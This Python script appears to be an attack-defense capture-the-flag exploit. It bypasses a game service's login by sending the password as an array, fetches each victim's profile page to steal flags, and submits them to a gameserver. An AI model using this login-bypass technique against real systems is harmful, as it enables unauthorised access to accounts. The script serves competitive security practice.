import json
import requests

from pwn import log

with open("configs/config.json", "r") as f:  # relative to CWD
    config: dict = json.load(f)


def local_test(exploit):
    def wrapper(*args, **kwargs):
        flags = exploit("127.0.0.1")
        log.info(f"We caught {flags = }")

    return wrapper


def nop_test(exploit):
    def wrapper(*args, **kwargs):
        nopteam = config["baseip"].format(id=0)

        flags = exploit(nopteam)
        try:
            result = submit_flags(flags)
            log.info(f"response from gameserver:\n{result}")
        except Exception as e:
            log.exception()

    return wrapper


def self_test(exploit):
    def wrapper(*args, **kwargs):
        teamip = config["baseip"].format(id=config["team_id"])

        flags = exploit(teamip)
        log.info(f"We caught {flags = }")

    return wrapper


def submit_flags(flags: list[str]):
    try:
        response = requests.put(
            "http://10.10.0.1:8080/flags",
            headers={"X-Team-Token": config["TEAM_TOKEN"]},
            json=flags,
            timeout=5,
        )
        response = response.json()["Flags"]  # this is now a list
        log.info(f"Got {response = }")
        return response
    except requests.ConnectTimeout as e:
        log.critical("Gameserver is unreachable!")
        raise e

    except requests.JSONDecodeError as e:
        log.critical(f"JSON decoding error!\n{response = }")
        raise e

    except Exception as e:
        log.critical(f"Unhandled exception was raise!\n{e}")


@nop_test
def exploit(target_ip: str):
    import urllib.parse

    r = requests.get("http://10.10.0.1:8081/flagIds").json()
    rets = []
    valid_flags = []
    emailslist = r["ilBonus"][target_ip]
    for email in emailslist:
        email = urllib.parse.quote_plus(email)
        form = f"email={email}&password%5B%5D=efj348u3"
        log.debug(form)
        with requests.Session() as s:
            resp = s.post(
                f"http://{target_ip}:8080/login",
                data=form,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
            ret = s.get(f"http://{target_ip}:8080/profilo")
            rets.append(ret.text)

    return rets


if __name__ == "__main__":
    exploit()
